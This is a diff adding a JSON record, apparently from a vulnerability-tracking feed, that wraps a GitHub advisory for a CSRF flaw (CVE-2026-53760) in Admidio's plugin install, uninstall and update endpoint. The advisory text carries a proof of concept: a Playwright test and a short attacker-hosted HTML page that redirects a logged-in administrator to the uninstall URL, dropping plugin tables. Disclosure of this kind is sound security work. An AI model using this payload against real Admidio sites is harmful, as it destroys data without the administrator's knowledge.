@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/11564377?v=4\", \"events_url\": \"https://api.github.com/users/adrgs/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/adrgs/followers\", \"following_url\": \"https://api.github.com/users/adrgs/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/adrgs/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/adrgs\", \"id\": 11564377, \"login\": \"adrgs\", \"node_id\": \"MDQ6VXNlcjExNTY0Mzc3\", \"organizations_url\": \"https://api.github.com/users/adrgs/orgs\", \"received_events_url\": \"https://api.github.com/users/adrgs/received_events\", \"repos_url\": \"https://api.github.com/users/adrgs/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/adrgs/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/adrgs/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/adrgs\", \"user_view_type\": \"public\"}}, {\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/253543362?v=4\", \"events_url\": \"https://api.github.com/users/aisafe-bot/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/aisafe-bot/followers\", \"following_url\": \"https://api.github.com/users/aisafe-bot/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/aisafe-bot/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/aisafe-bot\", \"id\": 253543362, \"login\": \"aisafe-bot\", \"node_id\": \"U_kgDODxzDwg\", \"organizations_url\": \"https://api.github.com/users/aisafe-bot/orgs\", \"received_events_url\": \"https://api.github.com/users/aisafe-bot/received_events\", \"repos_url\": \"https://api.github.com/users/aisafe-bot/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/aisafe-bot/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/aisafe-bot/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/aisafe-bot\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-53760\", \"cvss\": {\"score\": 5.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-352\", \"name\": \"Cross-Site Request Forgery (CSRF)\"}], \"description\": \"## Summary\\n\\nThe `modules/plugins.php` endpoint handles plugin installation, uninstallation, and update operations via GET requests without CSRF token validation. Because these are top-level navigations, browsers include `SameSite=Lax` session cookies. An attacker crafts a malicious page that, when an authenticated administrator visits it, triggers arbitrary plugin operations. The uninstall operation executes DROP TABLE SQL scripts and destroys plugin data.\\n\\n## Details\\n\\n`modules/plugins.php` reads the `mode` (install, uninstall, update) and `name` parameters directly from `$_GET`:\\n\\n```php\\n// modules/plugins.php\\n$mode = admFuncVariableIsValid($_GET, 'mode', 'string');\\n$pluginName = admFuncVariableIsValid($_GET, 'name', 'string');\\n```\\n\\nThe file contains zero calls to `SecurityUtils::validateCsrfToken()`. Other administrative operations in the same codebase (such as the `save` mode in preferences) validate CSRF tokens correctly.\\n\\nBecause the operations use GET requests, modern browsers send `SameSite=Lax` cookies on top-level GET navigations (link clicks, redirects, `window.location` assignments). A cross-origin page triggers these operations by navigating the browser to the vulnerable URL.\\n\\nThe `doUninstall()` function is the most destructive path. It executes SQL scripts from the plugin's `db_scripts/` directory, which contain `DROP TABLE` statements:\\n\\n```php\\n// modules/plugins.php - doUninstall()\\nfunction doUninstall($pluginFolder) {\\n    // Reads and executes SQL from $pluginFolder/db_scripts/uninstall.sql\\n    // Contains DROP TABLE statements\\n}\\n```\\n\\n## Proof of Concept\\n\\nThe following Playwright test demonstrates a cross-origin CSRF attack. An attacker hosts a page on a different origin that redirects an authenticated administrator's browser to the uninstall endpoint:\\n\\n```javascript\\n// playwright-csrf-poc.js\\nconst { test, expect } = require('@playwright/test');\\n\\ntest('CSRF plugin uninstall via cross-origin redirect', async ({ browser }) => {\\n    const context = await browser.newContext();\\n    const page = await context.newPage();\\n\\n    // Step 1: Admin logs in to Admidio\\n    await page.goto('https://admidio.example.com/adm_program/system/login.php');\\n    await page.fill('#usr_login_name', 'admin');\\n    await page.fill('#usr_password', 'password');\\n    await page.click('#btn_login');\\n    await page.waitForURL('**/overview.php');\\n\\n    // Step 2: Admin visits attacker-controlled page on different origin\\n    // The attacker page contains:\\n    //   <script>window.location = 'https://admidio.example.com/adm_program/modules/plugins.php?mode=uninstall&name=birthday';</script>\\n    await page.goto('https://attacker.example.com/csrf.html');\\n\\n    // Step 3: Browser follows redirect with SameSite=Lax cookies\\n    // The birthday plugin is uninstalled, its database tables dropped\\n    await page.waitForURL('**/plugins.php*');\\n\\n    // Verify the plugin was uninstalled\\n    await page.goto('https://admidio.example.com/adm_program/modules/plugins.php');\\n    const content = await page.content();\\n    expect(content).not.toContain('birthday');\\n});\\n```\\n\\nSimplified attacker page (`csrf.html` hosted on attacker origin):\\n\\n```html\\n<html>\\n<body>\\n<script>\\n  window.location = 'https://admidio.example.com/adm_program/modules/plugins.php?mode=uninstall&name=birthday';\\n</script>\\n</body>\\n</html>\\n```\\n\\nWhen an administrator visits this page, the browser navigates to the Admidio uninstall URL with full session cookies, and the server uninstalls the birthday plugin.\\n\\n## Impact\\n\\nAn unauthenticated attacker tricks an Admidio administrator into visiting a malicious web page (via phishing, forum post, or embedded content) that performs plugin operations without visible indication. The `uninstall` operation executes DROP TABLE statements, causing irreversible data loss. The `install` operation activates plugins with known vulnerabilities. The `update` operation disrupts plugin functionality. The victim only needs to visit a single page.\\n\\n## Recommended Fix\\n\\nSwitch plugin install, uninstall, and update operations from GET to POST requests. Add `SecurityUtils::validateCsrfToken()` checks to all state-changing operations in `modules/plugins.php`, consistent with the pattern used elsewhere in the codebase.\\n\\n---\\n*Found by [aisafe.io](https://aisafe.io)*\", \"epss\": {\"percentage\": 0.00013, \"percentile\": 0.02308}, \"ghsa_id\": \"GHSA-hm42-q32m-vj4f\", \"github_reviewed_at\": \"2026-07-09T13:44:40Z\", \"html_url\": \"https://github.com/advisories/GHSA-hm42-q32m-vj4f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hm42-q32m-vj4f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-53760\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-09T13:44:40Z\", \"references\": [\"https://github.com/Admidio/admidio/security/advisories/GHSA-hm42-q32m-vj4f\", \"https://github.com/advisories/GHSA-hm42-q32m-vj4f\"], \"repository_advisory_url\": \"https://api.github.com/repos/Admidio/admidio/security-advisories/GHSA-hm42-q32m-vj4f\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/Admidio/admidio\", \"summary\": \"Admidio: CSRF on Plugin Install, Uninstall, and Update via Unprotected GET Requests\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-09T13:44:41Z\", \"url\": \"https://api.github.com/advisories/GHSA-hm42-q32m-vj4f\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"composer\", \"name\": \"admidio/admidio\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 5.0.11\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hm42-q32m-vj4f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "admidio/admidio: <= 5.0.11"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-53760"
+    ],
+    "cvss_score": 5.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "admidio/admidio"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.504921Z",
+  "provenance": {
+    "content_sha256": "7fcf67f8517733d72f56f7a977e518fbd207387f9dd914bcdd1759f825922b1b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-09T13:44:40Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hm42-q32m-vj4f",
+  "status": "active",
+  "title": "Admidio: CSRF on Plugin Install, Uninstall, and Update via Unprotected GET Requests",
+  "updated_at": "2026-07-09T13:44:41Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hm42-q32m-vj4f"
+}
